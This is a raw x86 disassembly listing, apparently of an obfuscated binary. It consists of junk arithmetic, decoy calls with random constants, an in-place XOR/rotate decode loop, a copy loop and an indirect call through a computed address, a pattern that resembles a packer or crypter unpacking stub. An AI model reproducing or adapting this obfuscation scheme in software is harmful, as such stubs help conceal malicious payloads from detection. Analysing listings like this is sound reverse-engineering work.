  4170b2:	add    DWORD PTR [ebp-0x1c],esi
  4170b5:	mov    esi,DWORD PTR [ebp-0x1c]
  4170b8:	mov    edx,ebx
  4170ba:	sub    edx,ecx
  4170bc:	and    DWORD PTR [ebp-0x1c],esi
  4170bf:	sub    edi,ebx
  4170c1:	mov    DWORD PTR [ebp-0x1c],edi
  4170c4:	sub    DWORD PTR [ebp-0x1c],edx
  4170c7:	dec    DWORD PTR [ebp+0xc]
  4170ca:	mov    edx,0x9ac5
  4170cf:	add    edi,ebx
  4170d1:	sub    DWORD PTR [ebp-0x1c],edx
  4170d4:	mov    esi,DWORD PTR ds:0x42b05c
  4170da:	and    DWORD PTR [ebp-0x1c],esi
  4170dd:	cmp    edi,ebx
  4170df:	jne    0x4170e6
  4170e1:	or     edi,ecx
  4170e3:	and    DWORD PTR [ebp-0x1c],edi
  4170e6:	xor    DWORD PTR [ecx],eax
  4170e8:	mov    esi,ebx
  4170ea:	cmp    esi,DWORD PTR ds:0x42b05c
  4170f0:	je     0x417100
  4170f2:	mov    edx,DWORD PTR ds:0x42b04c
  4170f8:	and    esi,ebx
  4170fa:	add    DWORD PTR [ebp-0x1c],esi
  4170fd:	sub    DWORD PTR [ebp-0x1c],edx
  417100:	rol    DWORD PTR [ecx],0xf
  417103:	mov    edx,DWORD PTR [ebp-0x1c]
  417106:	xor    esi,esi
  417108:	add    DWORD PTR [ebp-0x1c],ebx
  41710b:	sub    edx,edi
  41710d:	add    DWORD PTR [ebp-0x1c],edx
  417110:	sub    esi,ebx
  417112:	or     esi,ecx
  417114:	add    DWORD PTR [ebp-0x1c],esi
  417117:	add    ecx,0x4
  41711a:	cmp    ecx,edx
  41711c:	jne    0x417140
  41711e:	cmp    ebx,DWORD PTR ds:0x42b04c
  417124:	jne    0x417140
  417126:	mov    edx,DWORD PTR [ebp-0x1c]
  417129:	mov    esi,DWORD PTR [ebp-0x1c]
  41712c:	add    edx,edi
  41712e:	test   edx,0xebc4
  417134:	je     0x417140
  417136:	and    edx,edi
  417138:	and    DWORD PTR [ebp-0x1c],esi
  41713b:	add    edx,eax
  41713d:	or     DWORD PTR [ebp-0x1c],edx
  417140:	jmp    0x41705c
  417145:	push   0x82b1e800
  41714a:	push   0x3e
  41714c:	push   0xffffffe2
  41714e:	push   0x59
  417150:	push   0xffffffa7
  417152:	call   0x4177cb
  417157:	add    esp,0x14
  41715a:	push   0x6
  41715c:	push   0x9a230a00
  417161:	call   0x4177cb
  417166:	add    esp,0x8
  417169:	mov    edx,DWORD PTR [ebp-0x1c]
  41716c:	push   0xb8a3f500
  417171:	push   0x66
  417173:	call   0x4177cb
  417178:	add    esp,0x8
  41717b:	push   0x88c59600
  417180:	push   0x9646ab00
  417185:	push   0xffffffb2
  417187:	push   0x58981500
  41718c:	call   0x417c22
  417191:	add    esp,0x10
  417194:	push   0x18a03d00
  417199:	push   0xa2201300
  41719e:	call   0x417ddd
  4171a3:	add    esp,0x8
  4171a6:	push   0xffffffd4
  4171a8:	push   0xffffffc9
  4171aa:	push   0xfffffffe
  4171ac:	push   0xa8b13c00
  4171b1:	call   0x417ddd
  4171b6:	add    esp,0x10
  4171b9:	pop    edi
  4171ba:	push   0xb64e1500
  4171bf:	push   0xc2ca8200
  4171c4:	push   0x8ee1d00
  4171c9:	call   0x4177cb
  4171ce:	add    esp,0xc
  4171d1:	pop    esi
  4171d2:	sub    eax,edi
  4171d4:	test   eax,0x392b
  4171d9:	je     0x4171ec
  4171db:	push   0x88994100
  4171e0:	push   0xffffffc5
  4171e2:	push   0xffffffed
  4171e4:	call   0x4177cb
  4171e9:	add    esp,0xc
  4171ec:	call   0x417ddd
  4171f1:	pop    ebx
  4171f2:	push   0x1a1d4c00
  4171f7:	call   0x417eff
  4171fc:	add    esp,0x4
  4171ff:	push   0x188d4c00
  417204:	push   0x1a
  417206:	push   0x363bbd00
  41720b:	push   0xda32bf00
  417210:	call   0x4177cb
  417215:	add    esp,0x10
  417218:	leave  
  417219:	ret    0xc
  41721c:	int3   
  41721d:	int3   
  41721e:	int3   
  41721f:	int3   
  417220:	int3   
  417221:	push   ebp
  417222:	mov    ebp,esp
  417224:	sub    esp,0x2c
  417227:	push   0x35
  417229:	push   0x19
  41722b:	call   0x417ddd
  417230:	add    esp,0x8
  417233:	push   ebx
  417234:	call   0x417c22
  417239:	push   esi
  41723a:	push   0xffffff8f
  41723c:	push   0x5af7c800
  417241:	push   0x73
  417243:	call   0x417eff
  417248:	add    esp,0xc
  41724b:	push   0x58952f00
  417250:	push   0x7a1b5e00
  417255:	push   0xffffffd6
  417257:	push   0x5ab77600
  41725c:	push   0xffffff9a
  41725e:	call   0x4177cb
  417263:	add    esp,0x14
  417266:	push   edi
  417267:	push   0x51
  417269:	push   0xffffff9a
  41726b:	push   0xffffff95
  41726d:	push   0x98a69a00
  417272:	call   0x41798a
  417277:	add    esp,0x10
  41727a:	push   0xffffffcb
  41727c:	push   0x48bc3000
  417281:	call   0x417c22
  417286:	add    esp,0x8
  417289:	push   0xfaf3b300
  41728e:	call   0x41798a
  417293:	add    esp,0x4
  417296:	mov    eax,0x52a021b1
  41729b:	mov    ebx,eax
  41729d:	mov    edx,ebx
  41729f:	mov    DWORD PTR [ebp-0x2c],edx
  4172a2:	sub    eax,0x52a02171
  4172a7:	mov    esi,0xc5a5
  4172ac:	mov    edx,DWORD PTR [ebp-0x2c]
  4172af:	sub    DWORD PTR [ebp-0x2c],edx
  4172b2:	mov    DWORD PTR [ebp-0x10],eax
  4172b5:	cmp    edx,0xffffffa8
  4172b8:	je     0x4172bf
  4172ba:	mov    esi,edx
  4172bc:	and    DWORD PTR [ebp-0x2c],esi
  4172bf:	push   eax
  4172c0:	mov    edi,DWORD PTR [ebp-0x10]
  4172c3:	push   0x6a
  4172c5:	push   0x73
  4172c7:	push   0xbe5e1b00
  4172cc:	push   0x42beca00
  4172d1:	call   0x417c22
  4172d6:	add    esp,0x10
  4172d9:	mov    ecx,DWORD PTR [ebp-0x2c]
  4172dc:	push   0x4d
  4172de:	push   0xfa97cc00
  4172e3:	push   0x5259fb00
  4172e8:	call   0x417eff
  4172ed:	add    esp,0xc
  4172f0:	cmp    edi,0x4f
  4172f3:	jne    0x417327
  4172f5:	push   0xa2439200
  4172fa:	push   0xffffffc8
  4172fc:	push   0x2fe4b00
  417301:	call   0x4177cb
  417306:	add    esp,0xc
  417309:	push   0x7aa27900
  41730e:	push   0x68b52b00
  417313:	push   0xffffffe8
  417315:	push   0x10
  417317:	push   0x18af0900
  41731c:	call   0x417ddd
  417321:	add    esp,0x14
  417324:	sub    DWORD PTR [ebp-0x2c],edi
  417327:	mov    edx,0x56e461e6
  41732c:	add    DWORD PTR [ebp-0x10],edx
  41732f:	add    edx,0xa91bae1a
  417335:	add    eax,eax
  417337:	or     eax,edi
  417339:	add    DWORD PTR [ebp-0x2c],edx
  41733c:	mov    ecx,DWORD PTR [ebp-0x2c]
  41733f:	mov    esi,0x88
  417344:	sub    DWORD PTR [ebp-0x10],esi
  417347:	test   ecx,0xbe
  41734d:	jne    0x41735d
  41734f:	or     eax,esi
  417351:	cmp    eax,0x59f7
  417356:	jne    0x41735d
  417358:	sub    eax,ecx
  41735a:	add    DWORD PTR [ebp-0x10],eax
  41735d:	push   edx
  41735e:	xor    ebx,ebx
  417360:	xor    edx,edx
  417362:	call   0x4177cb
  417367:	push   0xa657300
  41736c:	push   0xc8f03300
  417371:	push   0x26574400
  417376:	push   0xe
  417378:	call   0x417ddd
  41737d:	add    esp,0x10
  417380:	push   0x3c
  417382:	push   0xffffff9e
  417384:	push   0xffffffd4
  417386:	push   0x16235200
  41738b:	call   0x417ddd
  417390:	add    esp,0x10
  417393:	push   0xffffffe0
  417395:	push   0xf2315300
  41739a:	push   0x78975300
  41739f:	push   0x52
  4173a1:	push   0x5af26a00
  4173a6:	call   0x417c22
  4173ab:	add    esp,0x14
  4173ae:	push   0xfaa21d00
  4173b3:	push   0xffffffcf
  4173b5:	push   0xaa74a300
  4173ba:	call   0x41798a
  4173bf:	add    esp,0xc
  4173c2:	add    ebx,edi
  4173c4:	call   0x4177cb
  4173c9:	push   0xc62c5c00
  4173ce:	push   0x264f4f00
  4173d3:	push   0x7e5e0d00
  4173d8:	push   0x5e0c4800
  4173dd:	call   0x4177cb
  4173e2:	add    esp,0x10
  4173e5:	push   0xb
  4173e7:	push   0x6a
  4173e9:	push   0x88e68c00
  4173ee:	call   0x417c22
  4173f3:	add    esp,0xc
  4173f6:	push   0xfffffff0
  4173f8:	push   0xffffff8b
  4173fa:	push   0x522c6600
  4173ff:	push   0x38fdf100
  417404:	push   0x5aa4dd00
  417409:	call   0x4177cb
  41740e:	add    esp,0x14
  417411:	push   0xffffffbd
  417413:	push   0xc2a2f100
  417418:	push   0x1a37c900
  41741d:	call   0x417eff
  417422:	add    esp,0xc
  417425:	push   0x37
  417427:	push   0xffffff90
  417429:	push   0x662dc400
  41742e:	call   0x417c22
  417433:	add    esp,0xc
  417436:	sub    DWORD PTR [ebp-0x10],ebx
  417439:	push   0x2267000
  41743e:	push   0xffffff93
  417440:	call   0x41798a
  417445:	add    esp,0x8
  417448:	push   0x51945
  41744d:	call   0x4177cb
  417452:	push   0x0
  417454:	test   ebx,0x6b
  41745a:	jne    0x41745f
  41745c:	add    DWORD PTR [ebp-0x10],eax
  41745f:	mov    ebx,0xdec5c590
  417464:	push   0x821e2000
  417469:	push   0x2f5db00
  41746e:	push   0xffffffc1
  417470:	push   0x160e4600
  417475:	call   0x4177cb
  41747a:	add    esp,0x10
  41747d:	call   0x417eff
  417482:	sub    ebx,0xde8477cc
  417488:	call   0x417eff
  41748d:	push   0x54
  41748f:	push   0xfffffff8
  417491:	push   0xfaeae700
  417496:	call   0x41798a
  41749b:	add    esp,0xc
  41749e:	call   DWORD PTR [ebx]
  4174a0:	add    DWORD PTR [ebp-0x10],ebx
  4174a3:	mov    DWORD PTR [ebp-0x28],eax
  4174a6:	or     edi,eax
  4174a8:	and    edi,eax
  4174aa:	mov    ebx,DWORD PTR [ebp-0x10]
  4174ad:	xor    edx,edx
  4174af:	push   0x44
  4174b1:	push   0x2895b400
  4174b6:	call   0x417c22
  4174bb:	add    esp,0x8
  4174be:	push   0xf8838b00
  4174c3:	push   0x58b5a800
  4174c8:	push   0xfaa63c00
  4174cd:	push   0xd8fc8d00
  4174d2:	push   0xffffff87
  4174d4:	call   0x41798a
  4174d9:	add    esp,0x14
  4174dc:	call   0x4177cb
  4174e1:	push   0x58
  4174e3:	push   0xffffff8b
  4174e5:	push   0x42f40c00
  4174ea:	push   0x59
  4174ec:	push   0x621c6e00
  4174f1:	call   0x417eff
  4174f6:	add    esp,0x14
  4174f9:	or     edi,esi
  4174fb:	call   0x417ddd
  417500:	add    DWORD PTR [ebp-0x2c],edi
  417503:	push   0xf2750900
  417508:	push   0xc6702f00
  41750d:	call   0x4177cb
  417512:	add    esp,0x8
  417515:	add    DWORD PTR [ebp-0x2c],ebx
  417518:	mov    edx,0xb80f1970
  41751d:	xor    edi,edi
  41751f:	or     edi,ebx
  417521:	add    edi,esi
  417523:	mov    DWORD PTR [ebp-0x18],edx
  417526:	cmp    edi,edx
  417528:	jne    0x417544
  41752a:	mov    eax,esi
  41752c:	mov    ebx,DWORD PTR [ebp-0x2c]
  41752f:	add    DWORD PTR [ebp-0x18],edi
  417532:	sub    ebx,edi
  417534:	and    ebx,edi
  417536:	or     ebx,esi
  417538:	and    ebx,edi
  41753a:	add    DWORD PTR [ebp-0x18],ebx
  41753d:	add    edi,edx
  41753f:	and    edi,eax
  417541:	sub    DWORD PTR [ebp-0x18],edi
  417544:	add    edx,0x48339690
  41754a:	cmp    ebx,DWORD PTR [ebp-0x4]
  41754d:	jne    0x41755a
  41754f:	xor    eax,eax
  417551:	mov    ecx,ebx
  417553:	add    ecx,eax
  417555:	and    ecx,edi
  417557:	sub    DWORD PTR [ebp-0x18],ecx
  41755a:	mov    DWORD PTR [ebp-0x20],edx
  41755d:	mov    ebx,0xee
  417562:	or     DWORD PTR [ebp-0x2c],ebx
  417565:	mov    edi,DWORD PTR [ebp-0x28]
  417568:	push   0xa8a70600
  41756d:	push   0xffffffbc
  41756f:	call   0x417c22
  417574:	add    esp,0x8
  417577:	push   0x689f2f00
  41757c:	push   0x82b44e00
  417581:	push   0x8a242b00
  417586:	push   0x862fe200
  41758b:	push   0xffffff8c
  41758d:	call   0x417c22
  417592:	add    esp,0x14
  417595:	push   0x6e
  417597:	call   0x417eff
  41759c:	add    esp,0x4
  41759f:	call   0x417ddd
  4175a4:	mov    eax,DWORD PTR [ebp-0x20]
  4175a7:	mov    ecx,DWORD PTR [ebp-0x10]
  4175aa:	test   eax,0xc8
  4175af:	jne    0x4175c4
  4175b1:	mov    esi,DWORD PTR [ebp-0x2c]
  4175b4:	add    esi,ecx
  4175b6:	sub    esi,eax
  4175b8:	mov    edx,DWORD PTR [ebp-0x2c]
  4175bb:	and    DWORD PTR [ebp-0x10],edx
  4175be:	add    DWORD PTR [ebp-0x10],edi
  4175c1:	sub    DWORD PTR [ebp-0x2c],esi
  4175c4:	mov    esi,DWORD PTR [eax]
  4175c6:	mov    ecx,0xe649
  4175cb:	add    ecx,ecx
  4175cd:	mov    edx,DWORD PTR [ebp-0x10]
  4175d0:	sub    ecx,edx
  4175d2:	cmp    eax,0xffffff9b
  4175d5:	je     0x417605
  4175d7:	mov    ebx,DWORD PTR [ebp-0x2c]
  4175da:	mov    edx,DWORD PTR [ebp-0x10]
  4175dd:	cmp    ecx,edx
  4175df:	jne    0x417605
  4175e1:	cmp    ecx,0xfffffff0
  4175e4:	je     0x417605
  4175e6:	add    DWORD PTR [ebp-0x2c],esi
  4175e9:	cmp    ebx,0x45
  4175ec:	jne    0x417605
  4175ee:	cmp    esi,0xffffffc0
  4175f1:	jne    0x417605
  4175f3:	add    edx,ecx
  4175f5:	sub    ebx,edi
  4175f7:	cmp    ebx,0x14
  4175fa:	jne    0x417605
  4175fc:	or     ebx,ecx
  4175fe:	or     ebx,edx
  417600:	and    ebx,eax
  417602:	mov    DWORD PTR [ebp-0x18],ebx
  417605:	mov    ecx,DWORD PTR [eax+0x4]
  417608:	add    DWORD PTR [ebp-0x2c],ecx
  41760b:	or     esi,esi
  41760d:	je     0x4176c5
  417613:	sub    edx,esi
  417615:	sub    edx,ebx
  417617:	test   ecx,0x87
  41761d:	je     0x41766b
  41761f:	cmp    edx,0xffffff92
  417622:	jne    0x41766b
  417624:	mov    eax,DWORD PTR [ebp-0x2c]
  417627:	mov    ebx,DWORD PTR [ebp-0x18]
  41762a:	cmp    eax,edi
  41762c:	jne    0x41766b
  41762e:	test   ebx,0xe9
  417634:	jne    0x41766b
  417636:	add    edx,eax
  417638:	sub    DWORD PTR [ebp-0x10],edi
  41763b:	mov    eax,0x9035a110
  417640:	sub    edx,ebx
  417642:	and    eax,ebx
  417644:	and    edx,esi
  417646:	add    DWORD PTR [ebp-0x10],edx
  417649:	test   ecx,0xaf
  41764f:	jne    0x41766b
  417651:	mov    edx,0xff
  417656:	mov    ebx,0x4a
  41765b:	add    DWORD PTR [ebp-0x18],eax
  41765e:	add    edx,ecx
  417660:	add    ebx,esi
  417662:	xor    DWORD PTR [ebp-0x2c],ebx
  417665:	mov    DWORD PTR [ebp-0x10],edi
  417668:	mov    DWORD PTR [ebp-0x14],edx
  41766b:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41766d:	xor    eax,eax
  41766f:	push   0xfffffff0
  417671:	call   0x417c22
  417676:	add    esp,0x4
  417679:	or     esi,ebx
  41767b:	mov    eax,edi
  41767d:	add    DWORD PTR [ebp-0x18],esi
  417680:	cmp    eax,edi
  417682:	jne    0x41769a
  417684:	push   0xaa447d00
  417689:	push   0x37
  41768b:	push   0x7ac3fc00
  417690:	push   0x1e
  417692:	call   0x41798a
  417697:	add    esp,0x10
  41769a:	add    DWORD PTR [ebp-0x20],0x8
  41769e:	push   0x82dfe000
  4176a3:	push   0x21
  4176a5:	push   0x14
  4176a7:	push   0x37
  4176a9:	call   0x41798a
  4176ae:	add    esp,0x10
  4176b1:	push   0xd62e3400
  4176b6:	push   0xfffffffe
  4176b8:	call   0x4177cb
  4176bd:	add    esp,0x8
  4176c0:	jmp    0x417568
  4176c5:	push   0x667dc600
  4176ca:	push   0x4e
  4176cc:	push   0xfa9b9b00
  4176d1:	push   0x562b2400
  4176d6:	push   0x56
  4176d8:	call   0x4177cb
  4176dd:	add    esp,0x14
  4176e0:	mov    ebx,0x2abf
  4176e5:	mov    esi,ebx
  4176e7:	push   0xffffff9a
  4176e9:	call   0x417ddd
  4176ee:	add    esp,0x4
  4176f1:	push   0xffffff86
  4176f3:	push   0x829ee000
  4176f8:	call   0x417eff
  4176fd:	add    esp,0x8
  417700:	or     DWORD PTR [ebp-0x18],esi
  417703:	mov    eax,DWORD PTR [ebp-0x28]
  417706:	and    ebx,eax
  417708:	mov    esi,eax
  41770a:	sub    ebx,esi
  41770c:	add    ebx,eax
  41770e:	sub    DWORD PTR [ebp-0x2c],eax
  417711:	add    ebx,eax
  417713:	mov    esi,DWORD PTR [ebp-0x2c]
  417716:	sub    ebx,esi
  417718:	cmp    ebx,0xa
  41771b:	jne    0x417722
  41771d:	add    ebx,ebx
  41771f:	sub    DWORD PTR [ebp-0x2c],ebx
  417722:	add    DWORD PTR [ebp-0x2c],ebx
  417725:	pop    edi
  417726:	cmp    edi,DWORD PTR [ebp-0x24]
  417729:	je     0x417737
  41772b:	sub    ebx,eax
  41772d:	cmp    eax,0x38000064
  417732:	je     0x417737
  417734:	xor    DWORD PTR [ebp-0x2c],ebx
  417737:	pop    esi
  417738:	and    ebx,edi
  41773a:	sub    ebx,edi
  41773c:	cmp    ebx,DWORD PTR [ebp-0x18]
  41773f:	je     0x417759
  417741:	cmp    edi,ebx
  417743:	jne    0x417759
  417745:	or     DWORD PTR [ebp-0x18],esi
  417748:	mov    edx,DWORD PTR [ebp-0x2c]
  41774b:	test   ebx,0xe2fc
  417751:	je     0x417759
  417753:	sub    DWORD PTR [ebp-0x18],edx
  417756:	mov    DWORD PTR [ebp-0x2c],ebx
  417759:	pop    ebx
  41775a:	sub    edx,esi
  41775c:	mov    ecx,DWORD PTR [ebp-0x18]
  41775f:	add    edx,edx
  417761:	sub    DWORD PTR [ebp-0x2c],edx
  417764:	add    DWORD PTR [ebp-0x2c],esi
  417767:	cmp    ecx,eax
  417769:	jne    0x4177c4
  41776b:	add    ecx,ecx
  41776d:	mov    edx,DWORD PTR [ebp-0x2c]
  417770:	and    DWORD PTR [ebp-0x10],ecx
  417773:	cmp    edx,DWORD PTR [ebp-0x18]
  417776:	je     0x4177c4
  417778:	xor    ecx,ecx
  41777a:	sub    edx,edi
  41777c:	sub    edx,ecx
  41777e:	cmp    ebx,edx
  417780:	jne    0x4177c4
  417782:	mov    ecx,0x3a
  417787:	sub    DWORD PTR [ebp-0x2c],edx
  41778a:	add    ecx,ebx
  41778c:	add    ecx,edx
  41778e:	cmp    ebx,0x56
  417791:	jne    0x4177c4
  417793:	sub    ecx,ebx
  417795:	mov    edx,DWORD PTR ds:0x42b084
  41779b:	or     edx,esi
  41779d:	sub    DWORD PTR [ebp-0x18],ecx
  4177a0:	sub    edx,eax
  4177a2:	cmp    edx,DWORD PTR ds:0x42b084
  4177a8:	je     0x4177c4
  4177aa:	mov    ecx,DWORD PTR [ebp-0x18]
  4177ad:	add    edx,eax
  4177af:	add    DWORD PTR [ebp-0x18],ecx
  4177b2:	sub    DWORD PTR [ebp-0x2c],eax
  4177b5:	mov    DWORD PTR [ebp-0x10],ecx
  4177b8:	add    edx,ebx
  4177ba:	add    edx,eax
  4177bc:	cmp    edx,0x6d
  4177bf:	je     0x4177c4
  4177c1:	sub    DWORD PTR [ebp-0x10],edx
  4177c4:	leave  
  4177c5:	ret    
  4177c6:	int3   
  4177c7:	int3   
  4177c8:	int3   
  4177c9:	int3   
  4177ca:	int3   
  4177cb:	push   ebp
  4177cc:	mov    ebp,esp
  4177ce:	sub    esp,0x40
  4177d1:	mov    eax,0x5d
  4177d6:	add    eax,eax
  4177d8:	mov    edx,eax
  4177da:	sub    edx,eax
  4177dc:	mov    DWORD PTR [ebp-0x38],edx
  4177df:	push   ebx
  4177e0:	add    eax,eax
  4177e2:	mov    ecx,0x3194
  4177e7:	mov    edx,DWORD PTR [ebp-0x38]
  4177ea:	and    ecx,eax
  4177ec:	cmp    edx,0xffffffdd
  4177ef:	jne    0x417862
  4177f1:	mov    ebx,0x10
  4177f6:	and    ebx,eax
  4177f8:	add    edx,eax
  4177fa:	mov    ecx,edx
  4177fc:	test   ecx,0x5a
  417802:	je     0x417862
  417804:	mov    edx,0x5c
  417809:	add    DWORD PTR [ebp-0x38],ebx
  41780c:	sub    edx,ecx
  41780e:	mov    eax,DWORD PTR [ebp-0x38]
  417811:	add    DWORD PTR [ebp-0x38],edx
  417814:	cmp    eax,0xffffffb3
  417817:	je     0x417862
  417819:	cmp    ecx,DWORD PTR [ebp-0x28]
  41781c:	jne    0x417862
  41781e:	mov    ebx,0x4b
  417823:	mov    ecx,DWORD PTR [ebp-0x38]
  417826:	test   eax,0x5fee
  41782b:	je     0x417862
  41782d:	mov    edx,DWORD PTR [ebp-0x38]
  417830:	cmp    eax,0x4a
  417833:	je     0x417862
  417835:	cmp    eax,DWORD PTR [ebp-0x24]
  417838:	je     0x417862
  41783a:	and    ebx,ecx
  41783c:	mov    ecx,ebx
  41783e:	mov    ebx,DWORD PTR [ebp-0x38]
  417841:	add    DWORD PTR [ebp-0x38],ebx
  417844:	add    DWORD PTR [ebp-0x38],ecx
  417847:	xor    DWORD PTR [ebp-0x38],eax
  41784a:	cmp    edx,0x120a0904
  417850:	je     0x417862
  417852:	sub    DWORD PTR [ebp-0x38],ecx
  417855:	xor    eax,eax
  417857:	xor    ebx,ebx
  417859:	mov    DWORD PTR [ebp-0x38],edx
  41785c:	add    DWORD PTR [ebp-0x38],eax
  41785f:	add    DWORD PTR [ebp-0x38],ebx
  417862:	push   esi
  417863:	mov    edx,DWORD PTR [ebp-0x38]
  417866:	and    edx,ecx
  417868:	add    DWORD PTR [ebp-0x38],edx
  41786b:	push   edi
  41786c:	xor    ecx,ecx
  41786e:	mov    edi,0x24
  417873:	or     DWORD PTR [ebp-0x38],edi
  417876:	sub    ecx,ebx
  417878:	add    DWORD PTR [ebp-0x38],eax
  41787b:	and    ecx,eax
  41787d:	sub    eax,edi
  41787f:	sub    DWORD PTR [ebp-0x38],eax
  417882:	add    DWORD PTR [ebp-0x38],ebx
  417885:	sub    ecx,edx
  417887:	cmp    ecx,edx
  417889:	je     0x41788e
  41788b:	add    DWORD PTR [ebp-0x38],ecx
  41788e:	mov    edx,DWORD PTR [ebp-0x38]
  417891:	xor    edi,edi
  417893:	add    edx,ecx
  417895:	add    DWORD PTR [ebp-0x38],edi
  417898:	cmp    edx,DWORD PTR [ebp-0x4]
  41789b:	je     0x4178ea
  41789d:	cmp    edx,DWORD PTR [ebp-0x38]
  4178a0:	je     0x4178ea
  4178a2:	mov    esi,DWORD PTR [ebp-0x38]
  4178a5:	add    edx,ecx
  4178a7:	add    esi,eax
  4178a9:	mov    ebx,0xfe
  4178ae:	sub    DWORD PTR [ebp-0x38],ecx
  4178b1:	sub    DWORD PTR [ebp-0x38],ebx
  4178b4:	add    DWORD PTR [ebp-0x38],ecx
  4178b7:	cmp    edx,eax
  4178b9:	je     0x4178ea
  4178bb:	sub    DWORD PTR [ebp-0x38],esi
  4178be:	mov    eax,0xbe
  4178c3:	sub    edx,eax
  4178c5:	sub    edx,eax
  4178c7:	sub    edx,ecx
  4178c9:	mov    esi,DWORD PTR [ebp-0x38]
  4178cc:	sub    edx,eax
  4178ce:	sub    DWORD PTR [ebp-0x38],ebx
  4178d1:	add    DWORD PTR [ebp-0x38],esi
  4178d4:	sub    DWORD PTR [ebp-0x38],edi
  4178d7:	sub    edx,ecx
  4178d9:	sub    edx,ecx
  4178db:	add    edx,eax
  4178dd:	cmp    esi,DWORD PTR [ebp-0x30]
  4178e0:	je     0x4178ea
  4178e2:	mov    edi,DWORD PTR [ebp-0x38]
  4178e5:	sub    edx,edi
  4178e7:	add    DWORD PTR [ebp-0x38],edx
  4178ea:	mov    esi,DWORD PTR [ebp-0x38]
  4178ed:	mov    ebx,0x39
  4178f2:	cmp    edx,0x781c
  4178f8:	jne    0x417918
  4178fa:	mov    edi,0x29
  4178ff:	mov    ecx,0x9d
  417904:	add    DWORD PTR [ebp-0x38],ecx
  417907:	sub    DWORD PTR [ebp-0x38],edi
  41790a:	sub    DWORD PTR [ebp-0x38],esi
  41790d:	sub    ecx,eax
  41790f:	mov    DWORD PTR [ebp-0x38],ebx
  417912:	and    DWORD PTR [ebp-0x38],edx
  417915:	add    DWORD PTR [ebp-0x38],ecx
  417918:	sub    ecx,esi
  41791a:	sub    DWORD PTR [ebp-0x38],ecx
  41791d:	mov    esi,DWORD PTR [ebp-0x38]
  417920:	or     esi,eax
  417922:	mov    eax,DWORD PTR [ebp-0x38]
  417925:	add    esi,esi
  417927:	add    DWORD PTR [ebp-0x38],esi
  41792a:	sub    DWORD PTR [ebp-0x38],ecx
  41792d:	cmp    eax,DWORD PTR [ebp-0x28]
  417930:	je     0x417935
  417932:	and    DWORD PTR [ebp-0x38],eax
  417935:	pop    edi
  417936:	mov    ecx,eax
  417938:	mov    edx,0x30
  41793d:	and    edx,esi
  41793f:	or     DWORD PTR [ebp-0x38],ebx
  417942:	add    DWORD PTR [ebp-0x38],edi
  417945:	sub    edx,edi
  417947:	sub    DWORD PTR [ebp-0x38],edx
  41794a:	sub    ecx,edx
  41794c:	sub    ecx,ebx
  41794e:	add    DWORD PTR [ebp-0x38],ecx
  417951:	pop    esi
  417952:	cmp    esi,DWORD PTR [ebp-0x4]
  417955:	je     0x417962
  417957:	test   esi,0x65
  41795d:	jne    0x417962
  41795f:	sub    DWORD PTR [ebp-0x38],esi
  417962:	pop    ebx
  417963:	cmp    ebx,edx
  417965:	je     0x417983
  417967:	xor    ecx,ecx
  417969:	mov    eax,DWORD PTR [ebp-0x38]
  41796c:	cmp    esi,0x13
  41796f:	je     0x417983
  417971:	mov    edx,eax
  417973:	mov    eax,ebx
  417975:	cmp    edi,edx
  417977:	je     0x417983
  417979:	sub    edx,eax
  41797b:	mov    DWORD PTR [ebp-0x38],ecx
  41797e:	sub    edx,esi
  417980:	and    DWORD PTR [ebp-0x38],edx
  417983:	leave  
  417984:	ret    
  417985:	int3   
  417986:	int3   
  417987:	int3   
  417988:	int3   
  417989:	int3   
  41798a:	push   ebp
  41798b:	mov    ebp,esp
  41798d:	sub    esp,0x18
  417990:	xor    ecx,ecx
  417992:	mov    ecx,0xc5
  417997:	add    ecx,ecx
  417999:	mov    DWORD PTR [ebp-0xc],ecx
  41799c:	push   ebx
  41799d:	mov    ecx,0x5f
  4179a2:	mov    edx,DWORD PTR [ebp-0xc]
  4179a5:	cmp    edx,DWORD PTR [ebp-0x8]
  4179a8:	je     0x4179b4
  4179aa:	mov    ecx,0x23
  4179af:	sub    edx,ecx
  4179b1:	add    DWORD PTR [ebp-0xc],edx
  4179b4:	push   esi
  4179b5:	xor    DWORD PTR [ebp-0xc],ecx
  4179b8:	push   edi
  4179b9:	mov    edi,DWORD PTR [ebp-0xc]
  4179bc:	mov    ecx,edi
  4179be:	sub    DWORD PTR [ebp-0xc],ecx
  4179c1:	sub    edx,edi
  4179c3:	or     DWORD PTR [ebp-0xc],edx
  4179c6:	cmp    edi,0x57
  4179c9:	je     0x417a0c
  4179cb:	cmp    ecx,0xdbbf
  4179d1:	jne    0x417a0c
  4179d3:	xor    edi,edi
  4179d5:	add    edx,edx
  4179d7:	xor    ebx,ebx
  4179d9:	and    edx,ecx
  4179db:	cmp    edx,0x1b
  4179de:	je     0x417a0c
  4179e0:	mov    esi,0xbb
  4179e5:	or     edx,edi
  4179e7:	mov    ecx,0x7cf1
  4179ec:	add    edx,esi
  4179ee:	cmp    edx,0xfffffff9
  4179f1:	jne    0x417a0c
  4179f3:	add    DWORD PTR [ebp-0xc],edx
  4179f6:	mov    esi,DWORD PTR ds:0x42b080
  4179fc:	mov    ebx,DWORD PTR [ebp-0xc]
  4179ff:	add    ecx,edx
  417a01:	xor    DWORD PTR [ebp-0xc],ecx
  417a04:	add    DWORD PTR [ebp-0xc],esi
  417a07:	sub    ebx,edi
  417a09:	sub    DWORD PTR [ebp-0xc],ebx
  417a0c:	cmp    ecx,DWORD PTR [ebp-0x14]
  417a0f:	jne    0x417a17
  417a11:	mov    edi,DWORD PTR [ebp-0xc]
  417a14:	sub    DWORD PTR [ebp-0xc],edi
  417a17:	mov    edi,DWORD PTR [ebp-0xc]
  417a1a:	add    edi,ecx
  417a1c:	mov    eax,DWORD PTR [ebp-0xc]
  417a1f:	add    DWORD PTR [ebp-0xc],eax
  417a22:	and    edi,edx
  417a24:	cmp    edi,DWORD PTR [ebp-0xc]
  417a27:	je     0x417b3e
  417a2d:	cmp    edx,0x2a7e
  417a33:	je     0x417b3e
  417a39:	cmp    edx,0xffffffee
  417a3c:	je     0x417b3e
  417a42:	cmp    edi,0xffffffbd
  417a45:	jne    0x417b3e
  417a4b:	xor    eax,eax
  417a4d:	xor    esi,esi
  417a4f:	sub    DWORD PTR [ebp-0xc],edi
  417a52:	sub    DWORD PTR [ebp-0xc],eax
  417a55:	and    eax,ebx
  417a57:	cmp    edx,DWORD PTR ds:0x42b080
  417a5d:	je     0x417b3e
  417a63:	mov    edx,0x32
  417a68:	add    DWORD PTR [ebp-0xc],esi
  417a6b:	xor    ecx,ecx
  417a6d:	or     eax,esi
  417a6f:	cmp    eax,esi
